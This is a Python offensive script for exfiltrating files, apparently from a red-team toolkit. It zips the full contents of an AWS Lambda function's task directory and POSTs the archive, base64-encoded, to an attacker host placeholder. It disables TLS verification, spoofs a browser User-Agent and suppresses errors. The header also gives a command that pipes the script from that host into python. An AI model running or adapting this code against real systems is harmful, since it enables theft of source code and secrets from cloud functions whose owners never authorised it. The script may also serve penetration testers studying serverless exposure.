#!/usr/bin/env python
#
# This script can be used to exfiltrate all of the AWS Lambda source files from
#   $LAMBDA_TASK_ROOT (typically: /var/task) in a form of out-of-band http/s POST
# request. Such request will contain an `exfil` variable with urlencode(base64(zip_file)) in it.
# This zip file then will contain all of the $LAMBDA_TASK_ROOT (/var/task) directory contents.
#
# Can be used with webhook.site, using similar OS command as following:
#
#   $ curl -s https://<ATTACKER>/exfiltrateLambdaTasksDirectory.py | python
#
# Author: Mariusz Banach, '19, <mb@binary-offensive.com>
#

import zipfile, StringIO
import base64, os, sys
import urllib, urllib2, ssl

# 
# Set below address to the HTTP(S) web server that will receive exfiltrated
# ZIP file in a form of a HTTP POST request (within parameter 'exfil')
#
EXFILTRATE_OUTBAND_ADDRESS = 'https://<ATTACKER>/lambda-exfil'


class InMemoryZip(object):
    # Source: 
    #   - https://www.kompato.com/post/43805938842/in-memory-zip-in-python
    #   - https://stackoverflow.com/a/2463818

    def __init__(self):
        self.in_memory_zip = StringIO.StringIO()

    def append(self, filename_in_zip, file_contents):
        zf = zipfile.ZipFile(self.in_memory_zip, "a", zipfile.ZIP_DEFLATED, False)
        zf.writestr(filename_in_zip, file_contents)
        for zfile in zf.filelist:
            zfile.create_system = 0

        return self

    def read(self):
        self.in_memory_zip.seek(0)
        return self.in_memory_zip.read()

def fetch_files(imz, rootdir):
    for folder, subs, files in os.walk(rootdir):
        for filename in files:
            real_path = os.path.join(folder, filename)
            with open(real_path, 'r') as src:
                zip_path = real_path.replace(rootdir + '/', '')
                imz.append(zip_path, src.read())

def post(data):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
        "Accept-Language": "en-US,en;q=0.5", 
        "Accept-Encoding": "gzip, deflate", 
    }

    data = {'exfil': base64.b64encode(data)}
    data = urllib.urlencode(data)

    ssl._create_default_https_context = ssl._create_unverified_context
    r = urllib2.Request(EXFILTRATE_OUTBAND_ADDRESS, data=data, headers=headers)
    resp = urllib2.urlopen(r)
    if resp: resp.read()

def main():
    rootdir = os.environ['LAMBDA_TASK_ROOT']
    imz = InMemoryZip()
    fetch_files(imz, rootdir)
    post(imz.read())

try:
    main()
except:
    pass
